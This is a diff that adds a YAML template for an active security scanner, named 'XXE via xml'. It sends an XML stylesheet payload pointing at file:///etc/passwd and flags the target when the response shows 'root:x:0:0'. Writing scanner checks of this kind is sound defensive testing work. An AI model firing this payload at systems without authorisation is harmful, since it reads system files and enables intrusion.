@@ -1,0 +1,21 @@
+id: xxe-071
+name: 'XXE via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via xml'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<?xml-stylesheet type="text/xsl" href="file:///etc/passwd"?>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
